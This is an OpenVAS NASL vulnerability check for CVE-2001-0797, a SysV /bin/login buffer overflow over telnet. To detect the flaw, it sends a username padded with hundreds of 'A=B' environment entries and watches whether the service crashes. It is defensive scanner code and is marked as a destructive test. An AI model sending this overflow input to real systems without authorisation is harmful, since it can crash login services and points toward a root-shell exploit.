# OpenVAS Vulnerability Test
# $Id: binlogin_overflow_telnet.nasl 16 2013-10-27 13:09:52Z jan $
# Description: SysV /bin/login buffer overflow (telnet)
#
# Authors:
# Renaud Deraison <deraison@nessus.org>
#
# Copyright:
# Copyright (C) 2001 Renaud Deraison
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "The remote /bin/login seems to crash when it receives too many
environment variables.

An attacker may use this flaw to gain a root shell on this system.";

tag_solution = "Contact your vendor for a patch (or read the CERT advisory)";

# Sun's patch makes /bin/login exits when it receives too many arguments,
# hence making the detection of the flaw difficult. Our logic is the
# following :
#
# Username: "openvas" -> should not crash
# Username: "openvas A=B..... x 61"  -> should not crash
# Username: "openvas A=B..... x 100" -> should crash

if (description) {
   script_id(80049);;
   script_version("$Revision: 16 $");
   script_tag(name:"last_modification", value:"$Date: 2013-10-27 14:09:52 +0100 (Sun, 27 Oct 2013) $");
   script_tag(name:"creation_date", value:"2008-10-24 23:33:44 +0200 (Fri, 24 Oct 2008)");
   script_xref(name:"IAVA", value:"2001-a-0014");
   script_bugtraq_id(3681, 7481);
   script_cve_id("CVE-2001-0797");
   script_xref(name:"IAVA", value:"2002-A-0004");
   script_tag(name:"cvss_base", value:"10.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
   script_tag(name:"risk_factor", value:"Critical");
  name = "SysV /bin/login buffer overflow (telnet)";
  script_name(name);
 
  desc = "
   Summary:
   " + tag_summary + "
   Solution:
   " + tag_solution;
  script_description(desc);

  summary = "Attempts to overflow /bin/login";
  script_summary(summary);
 
  script_category(ACT_DESTRUCTIVE_ATTACK);
 
  script_copyright("This script is Copyright (C) 2001 Renaud Deraison");

  family = "Gain a shell remotely";
  script_family(family);

  script_dependencies("find_service1.nasl");
  script_require_ports("Services/telnet", 23);
   if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
     script_tag(name : "solution" , value : tag_solution);
     script_tag(name : "summary" , value : tag_summary);
   }
   script_xref(name : "URL" , value : "http://www.cert.org/advisories/CA-2001-34.html");
  exit(0);
}


include('telnet_func.inc');
port = get_kb_item("Services/telnet");
if(!port) port = 23;
if(!get_port_state(port))exit(0);

function login(env, try)
{
  local_var	i, soc, r, buffer;

  # if (try <= 0) try = 1;
  for (i = 0; i < try; i ++)
  {
    sleep(i);
    soc = open_sock_tcp(port);
    if (soc) break;
  }

   if (soc)
   {

 buffer = telnet_negotiate(socket:soc);
 send(socket:soc, data:string("openvas ", env, "\r\n"));
 r = recv(socket:soc, length:4096);
 close(soc);
 if("word:" >< r)
  {
	return(1);
  }
 }
 return(0);
}



if(login(env:"", try: 1))
{
 my_env = crap(data:"A=B ", length:244);
 res = login(env:my_env);
 if(res)
 {
  my_env = crap(data:"A=B ", length:400);
  res = login(env:my_env, try: 4);
  if(!res)security_hole(port);
 }
}
